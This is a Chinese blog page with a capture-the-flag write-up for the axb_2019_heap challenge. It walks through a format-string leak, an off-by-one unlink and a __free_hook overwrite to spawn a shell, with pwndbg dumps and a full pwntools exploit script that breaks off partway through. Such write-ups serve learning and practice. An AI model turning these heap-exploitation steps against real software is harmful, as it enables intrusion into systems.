<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 3 | winter - 像初雪一样自由洒落</title>
  <meta name="author" content="winter">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 4.2.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>winter - 像初雪一样自由洒落<span class="blink-fast">∎</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		Keep and carry on.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/25/axb-2019-heap详解/" >axb_2019_heap详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-25  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>关于axb_2019_heap的详解</p>
<p>参考：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362" target="_blank" rel="noopener">buuctf  axb_2019_heap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>banner：存在格式化字符串漏洞，可以泄漏栈上的信息</p>
</li>
<li><p>add：根据idx创建size（大于0x80）大小的内容为content的块</p>
<p>块指针和块大小存放在一个全局变量note中</p>
</li>
<li><p>delete：释放的很干净，没有uaf</p>
</li>
<li><p>edit：存在off by one</p>
<p><code>get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));</code></p>
<p><code>if ( a2 + 1 &lt;= (unsigned int)v3 )</code>v3是以及输入的长度，a2是给定的长度，存在一个字节的溢出</p>
</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote>
<p>这个程序没有保留调试信息，不能调试，只能一步步看，，，</p>
<p><a href="https://www.yanbinghu.com/2019/04/20/41283.html" target="_blank" rel="noopener">GDB调试指南</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reading symbols from axb_2019_heap...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li><p>利用格式化字符串泄露栈上信息</p>
<ul>
<li><p><code>__libc_start_main+240</code> =&gt; libc基地址</p>
</li>
<li><p>(main) ◂— push   rbp =&gt; 程序基地址</p>
</li>
</ul>
</li>
<li><p>由于存在全局变量note，故可以利用unlink控制chunk指针</p>
</li>
<li><p>修改__free_hook为system，get shell</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-格式化字符串"><a href="#1-格式化字符串" class="headerlink" title="1.格式化字符串"></a>1.格式化字符串</h4><blockquote>
<p>计算偏移：直接算或者用工具 =&gt; 得到偏移为7</p>
</blockquote>
<p><img src="/2021/04/25/axb-2019-heap%E8%AF%A6%E8%A7%A3/image-20210425142716133.png" alt="image-20210425142716133"></p>
<blockquote>
<p>执行到<code>printf(&amp;format);</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► 0x555555554b4e &lt;banner+105&gt;    call   printf@plt &lt;printf@plt&gt;</span><br><span class="line">       format: 0x7fffffffde4c ◂— &#39;aaaaaaaa&#39;</span><br><span class="line">       vararg: 0x7fffffffb7b0 ◂— &#39;Hello, our name:&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp    0x7fffffffde40 ◂— 0x0</span><br><span class="line">01:0008│ rdi-4  0x7fffffffde48 ◂— 0x61616161ffffde60</span><br><span class="line">02:0010│        0x7fffffffde50 ◂— 0x550061616161 &#x2F;* &#39;aaaa&#39; *&#x2F;	#输入的数据</span><br><span class="line">03:0018│        0x7fffffffde58 ◂— 0xd23db0a55446d00</span><br><span class="line">04:0020│ rbp    0x7fffffffde60 —▸ 0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│        0x7fffffffde68 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0</span><br><span class="line">06:0030│        0x7fffffffde70 —▸ 0x7fffffffdf60 ◂— 0x1</span><br><span class="line">07:0038│        0x7fffffffde78 ◂— 0x0</span><br><span class="line">08:0040│        0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">09:0048│        0x7fffffffde88 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax	#可以泄露libc_base</span><br><span class="line">0a:0050│        0x7fffffffde90 ◂— 0x1</span><br><span class="line">0b:0058│        0x7fffffffde98 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2d3 ◂— &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;axb_2019_heap&#39;</span><br><span class="line">0c:0060│        0x7fffffffdea0 ◂— 0x1f7ffcca0</span><br><span class="line">0d:0068│        0x7fffffffdea8 —▸ 0x55555555516a (main) ◂— push   rbp	#main起始地址，可以泄露程序基地址</span><br></pre></td></tr></table></figure>

<p>所以<code>__libc_start_main+240</code>的偏移为15，<code>main</code>的偏移为19。</p>
<p>通过计算即可得到libc_base和程序基地址（开启了pie，每次都不一样）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br></pre></td></tr></table></figure>

<h4 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h4><blockquote>
<p>首先计算note地址 = 程序基地址 + note偏移 =&gt; <code>note = pro_base + 0x0202060</code></p>
<p>接着申请三个块，0x98大小（方便修改下一个chunk）</p>
<ul>
<li>第一个chunk：构造fake chunk</li>
<li>第二个chunk：用于释放，unlink</li>
<li>第三个chunk：防止第二个chunk和top chunk合并</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6560a0</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6561e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x55830d656000</span><br><span class="line">0x55830d656000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d656010:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x55830d656020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d6560a0:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d6560b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55830d6560c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55830ca49060</span><br><span class="line">0x55830ca49060 &lt;note&gt;:	0x000055830d656010	0x0000000000000098</span><br><span class="line">0x55830ca49070 &lt;note+16&gt;:	0x000055830d6560b0	0x0000000000000098</span><br><span class="line">0x55830ca49080 &lt;note+32&gt;:	0x000055830d656150	0x0000000000000098</span><br><span class="line">0x55830ca49090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x98,&#39;aaaa&#39;)</span><br><span class="line">add(1,0x98,&#39;bbbb&#39;)</span><br><span class="line">add(2,0x98,&#39;cccc&#39;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 通过第一个chunk构造，并off by one修改第二个chunk的大小。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55d2cb54e0a0</span><br><span class="line">Size: 0xa0			#修改标志位，表示上一个chunk被释放</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55d2cb54e1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55d2cb54e000</span><br><span class="line">0x55d2cb54e000:	0x0000000000000000	0x00000000000000a1	#第一个chunk</span><br><span class="line">0x55d2cb54e010:	0x0000000000000000	0x0000000000000090	#fake chunk</span><br><span class="line">0x55d2cb54e020:	0x000055d2cb00d048	0x000055d2cb00d050	#fd、bk</span><br><span class="line">0x55d2cb54e030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55d2cb54e0a0:	0x0000000000000090	0x00000000000000a0	#pre_size &#x3D; 0x90,size &#x3D; 0xa0</span><br><span class="line">0x55d2cb54e0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55d2cb54e0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note &#x3D; pro_base + 0x0202060</span><br><span class="line">payload &#x3D; p64(0) + p64(0x90)</span><br><span class="line">payload +&#x3D; p64(fd) + p64(bk)</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p64(0x90) + p8(0xa0)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(0,payload)</span><br><span class="line">print(hex(note))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>释放第二个chunk，造成unlink，target = target - 0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#没变化</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf0a0</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55682bfdf140</span><br><span class="line">Size: 0xa0</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55682bfdf1e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682bfdf000</span><br><span class="line">0x55682bfdf000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55682bfdf010:	0x0000000000000000	0x0000000000000131	#合并了，大小为0x90 + 0xa0</span><br><span class="line">0x55682bfdf020:	0x00007fea30ac5b78	0x00007fea30ac5b78</span><br><span class="line">0x55682bfdf030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf090:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55682bfdf0a0:	0x0000000000000090	0x00000000000000a0</span><br><span class="line">0x55682bfdf0b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55682bfdf0c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55682b44c060</span><br><span class="line">0x55682b44c060 &lt;note&gt;:	0x000055682b44c048	0x0000000000000098#target &#x3D; target - 0x18</span><br><span class="line">0x55682b44c070 &lt;note+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55682b44c080 &lt;note+32&gt;:	0x000055682bfdf150	0x0000000000000098</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>

<h4 id="3-修改-free-hook为system"><a href="#3-修改-free-hook为system" class="headerlink" title="3.修改__free_hook为system"></a>3.修改__free_hook为system</h4><blockquote>
<p>通过第一个chunk，覆盖第一个chunk的指针指向__free_hook的地址</p>
<p>设置第二个chunk为参数“/bin/sh\x00”，只要让chunk2指向后面的地址，在上面的地址布置上字符串即可。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55cbe5291060</span><br><span class="line">0x55cbe5291060 &lt;note&gt;:	0x00007f962216f7a8	0x0000000000000098		#__free_hook地址</span><br><span class="line">0x55cbe5291070 &lt;note+16&gt;:	0x000055cbe5291078	0x0068732f6e69622f	#binsh地址 binsh字符串</span><br><span class="line">0x55cbe5291080 &lt;note+32&gt;:	0x000055cbe5975100	0x0000000000000098</span><br><span class="line">0x55cbe5291090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f962216f7a8</span><br><span class="line">0x7f962216f7a8 &lt;__free_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">payload &#x3D; p64(0) * 3</span><br><span class="line">payload +&#x3D; p64(free_hook) + p64(0x98)</span><br><span class="line">payload +&#x3D; p64(note + 24) +&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">edit(0,payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>第一个chunk指向<code>__free_hook</code>，往chunk1填入数据就是往<code>__free_hook</code>填入数据，修改其为system地址。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5578fc638060</span><br><span class="line">0x5578fc638060 &lt;note&gt;:	0x00007f909293e7a8	0x0000000000000098</span><br><span class="line">0x5578fc638070 &lt;note+16&gt;:	0x00005578fc638078	0x0068732f6e69622f</span><br><span class="line">0x5578fc638080 &lt;note+32&gt;:	0x00005578fd63e100	0x0000000000000098</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f909293e7a8</span><br><span class="line">0x7f909293e7a8 &lt;__free_hook&gt;:	0x00007f90925bd3a0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007f90925bd3a0</span><br><span class="line">0x7f90925bd3a0 &lt;__libc_system&gt;:	0xfa86e90b74ff8548</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0,p64(system))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>最后，释放第二个chunk即可执行free(2) =&gt; system(“/bin/sh\x00”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",28733)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./axb_2019_heap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"to create (0-10):"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter a size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter an index:"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the content: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span 